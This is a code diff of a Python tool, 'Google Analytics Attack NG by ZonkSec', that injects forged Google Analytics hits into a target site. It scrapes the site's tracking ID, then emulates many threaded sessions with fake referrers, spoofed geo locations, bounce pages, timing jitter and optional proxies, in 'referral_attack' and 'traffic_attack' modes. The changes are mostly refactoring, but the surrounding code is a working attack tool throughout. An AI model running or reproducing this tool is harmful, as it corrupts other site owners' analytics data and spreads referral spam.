@@ -13,6 +13,7 @@ import argparse
 #https://developers.google.com/analytics/devguides/collection/protocol/v1/geoid
 
 def main():
+    ascii_art()
     global proxies
     global ignore_certs
     ignore_certs = False
@@ -23,22 +24,22 @@ def main():
         #'https': 'https://192.168.0.107:8080'
     }
 
-    parser = argparse.ArgumentParser(description='Google Analytics Attack NG By ZonkSec')
-    parser.add_argument('-m','--mode',choices=['referral_attack', 'traffic_attack'],help='Required. This tells the script which mode to operate in',required=True)
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-m','--mode',choices=['referral_attack', 'traffic_attack'],help='required.',required=True)
     parser.add_argument('-v', '--verbose', help="increase output verbosity",action="store_true")
-    parser.add_argument('--target_url', help='required.', required=True)
-    parser.add_argument('--referral_url', help='required.',required=True)
-    parser.add_argument('-n','--number_of_sessions', help='required. total number of sessions to be emulated',required=True,type=int)
+    parser.add_argument('--target_url', help='required for referral_attack mode', metavar='')
+    parser.add_argument('--referral_url', help='required for referral_attack mode',metavar='')
+    parser.add_argument('-n','--number_of_sessions', help='required. total number of sessions to be emulated',metavar='',type=int)
     parser.add_argument('--threads', help='number of threads, aka concurrent sessions', default=1, type=int, metavar='')
     parser.add_argument('--geo_list', help='list of origin geo locations. \'criteriaID\' or \'criteriaIDs-criteriaIDs\'',metavar='',nargs='+')
     parser.add_argument('--user_delay', help='delay between users/threads', default=0, type=int, metavar='')
-    parser.add_argument('--user_jitter', help='amount of randomness in user_delay', default=0, type=float, metavar='')
+    parser.add_argument('--user_jitter', help='amount of randomness in user_delay', default=0, type=jitter_type, metavar='')
     parser.add_argument('--bounces', help='number of bounces between target pages',type=int,metavar='',default=0)
     parser.add_argument('--bounce_urls', help='specific URLs to bounce too. If not set, it will be auto-populated via Google Search',nargs='+',metavar='')
-    parser.add_argument('--bounce_jitter',metavar='',help='amount of randomness in bounce URL selection',type=float,default=0)
+    parser.add_argument('--bounce_jitter',metavar='',help='amount of randomness in bounce URL selection',type=jitter_type,default=0)
     parser.add_argument('--bounce_pool',metavar='',help='determines # of URLs to retreive from Google, if not proving bounce_urls',type=int,default=20)
     parser.add_argument('--session_delay',metavar='',help='amount of seconds between bounces in a session',type=int,default=0)
-    parser.add_argument('--session_jitter',metavar='',help='amount of randomness in session_delay',type=float,default=0)
+    parser.add_argument('--session_jitter',metavar='',help='amount of randomness in session_delay',type=jitter_type,default=0)
     parser.add_argument('--end_with',action="store_true",help='end with a bounce to target page')
     parser.add_argument('--proxy', help='use a proxy to make requests. note: google searches not included', metavar='')
     parser.add_argument('--ignore_certs', help='ignore ssl certs when making requests. note: google searches not included',action="store_true")
@@ -48,6 +49,12 @@ def main():
         logging.basicConfig(level=logging.DEBUG)
     else:
         logging.basicConfig(level=logging.INFO)
+
+    if args.mode == 'referral_attack':
+        if not args.target_url or not args.referral_url or not args.number_of_sessions:
+            logging.error('[-] target_url,referral_url, and number_of_sessions are required for referral_attack')
+            sys.exit(1)
+
 
     if args.proxy:
         if re.search("(socks5:\/\/.*:.)", args.proxy):
@@ -77,7 +84,7 @@ def main():
 
     if args.mode == 'referral_attack':
         session = referral_attack(target_url=args.target_url, referral_url=args.referral_url,bounce_urls=args.bounce_urls, bounces=args.bounces, bounce_jitter=args.bounce_jitter, session_jitter=args.session_jitter, session_delay=args.session_delay, end_with=args.end_with,bounce_pool=args.bounce_pool,geo_list=args.geo_list)
-        single_page_attack(session=session, number_of_sessions=args.number_of_sessions, threads=args.threads,user_delay=args.user_delay,user_jitter=args.user_jitter)
+        thread_master(session=session, number_of_sessions=args.number_of_sessions, threads=args.threads, user_delay=args.user_delay, user_jitter=args.user_jitter)
     elif args.mode == 'traffic_attack':
         session = traffic_attack(target_site='http://zonksec.com', target_site_urls=args.traffic_urls,referral_keyword='how to hack',target_site_url_pool=5, referral_pool=10, bounces=2, session_delay=0, session_jitter=0)
         session.run(client_id=402)
@@ -94,24 +101,29 @@ def build_geo_list(geo_list):
     return list
 
 
+def jitter_type(x):
+    x = float(x)
+    if not x <= 1 or not x >=0:
+        raise argparse.ArgumentTypeError("jitter must be between 0 and 1.")
+    return x
 
 
 
-def single_page_attack(session, number_of_sessions, threads=1, user_delay=5, user_jitter=.50):
+def thread_master(session, number_of_sessions, threads=1, user_delay=5, user_jitter=.50):
     session_queue = Queue()
     logging.info('[*] Queueing %s sessions.', str(number_of_sessions))
     for _ in range(number_of_sessions):
         session_queue.put("")
     logging.info('[*] Starting %s threads.', str(threads))
     for i in range(threads):
-        worker = Thread(target=thread_session, args=(i, session_queue, session, user_delay, user_jitter))
+        worker = Thread(target=thread_worker, args=(i, session_queue, session, user_delay, user_jitter))
         worker.setDaemon(True)
         worker.start()
     logging.info('[*] Waiting for threads.')
     session_queue.join()
     logging.info('[*] Single Page Attack Complete.')
 
-def thread_session(i,q,session,delay=5,jitter=.50):
+def thread_worker(i, q, session, delay=5, jitter=.50):
     while True:
         q.get()
         cid = session.random_unique_cid()
@@ -125,7 +137,7 @@ def thread_session(i,q,session,delay=5,jitter=.50):
         q.task_done()
 
 class referral_attack:
-    def __init__(self, target_url, referral_url, bounce_urls = None, session_delay=30, session_jitter=.50, bounces=0, bounce_pool = 20, loop=1, end_with=False, tracking_id=None, geo_id='',bounce_jitter=.50,geo_list=None):
+    def __init__(self, target_url, referral_url, bounce_urls = None, session_delay=30, session_jitter=.50, bounces=0, bounce_pool = 20, session_loop=1, end_with=False, tracking_id=None, geo_id='',bounce_jitter=.50,geo_list=None):
         self.target_url = target_url
         self.referral_url = referral_url
         self.page_delay = session_delay
@@ -133,7 +145,7 @@ class referral_attack:
         self.geo_id = geo_id
         self.bounces = bounces
         self.bounce_urls = bounce_urls
-        self.loop=loop
+        self.session_loop=session_loop
         self.end_with = end_with
         self.used_cids = []
         self.client_id = self.random_unique_cid()
@@ -149,8 +161,12 @@ class referral_attack:
         #grabs tracking ID from target site.
         if self.tracking_id is None:
             page = requests.get(target_url,proxies=proxies,verify=(not ignore_certs))
-            m = re.search("'(UA-(.*))',", page.text)
-            self.tracking_id = str(m.group(1))
+            try:
+                m = re.search("'(UA-(.*))',", page.text)
+                self.tracking_id = str(m.group(1))
+            except:
+                logging.error('trackingID not found. target may not be running analytics')
+                sys.exit(1)
 
         #if bounce urls are need, collects them.
         if self.bounces != 0 and self.bounce_urls is None:
@@ -185,7 +201,7 @@ class referral_attack:
         loop_count = 0
         last_page = self.referral_url
         pages.append(last_page)
-        while loop_count < self.loop:
+        while loop_count < self.session_loop:
             target_request = analytics_request(document_location=self.target_url,document_referrer=last_page,client_id=client_id,tracking_id=self.tracking_id,geo_id=geo_id)
             target_request.send()
             pages.append('[T]'+self.target_url)
@@ -244,8 +260,12 @@ class traffic_attack:
 
         if self.tracking_id is None:
             page = requests.get(self.target_site,proxies=proxies,verify=(not ignore_certs))
-            m = re.search("'(UA-(.*))',", page.text)
-            self.tracking_id = str(m.group(1))
+            try:
+                m = re.search("'(UA-(.*))',", page.text)
+                self.tracking_id = str(m.group(1))
+            except:
+                logging.error('trackingID not found. target may not be running analytics')
+                sys.exit(1)
 
         if self.referral_keyword:
             logging.info('[*] Referral URLs are needed.')
@@ -301,7 +321,20 @@ class traffic_attack:
             print(behavior[:-4])
 
 
-
+def ascii_art():
+    print("""
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+     Google Analytics Attack NG                         
+            by ZonkSec                                  
+__   __   __   __   __   __   .-. __   __ .-. __   __   
+                             (o o)       (o o)          
+                             | O \       | O \          
+                              \   \       \   \         
+                               `~~~'       `~~~'        
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Website:  https://zonksec.com
+Twitter:  @zonksec
+""")
 
 
 
@@ -319,9 +352,8 @@ class analytics_request:
         self.anon_ip = anon_ip
 
         if self.tracking_id is None:
-            page = requests.get(document_location,proxies=proxies,verify=(not ignore_certs))
-            m = re.search("'(UA-(.*))',", page.text)
-            self.tracking_id = str(m.group(1))
+            logging.error('[-] trackingID not set.')
+            sys.exit(1)
 
     def send(self):
         params = {}
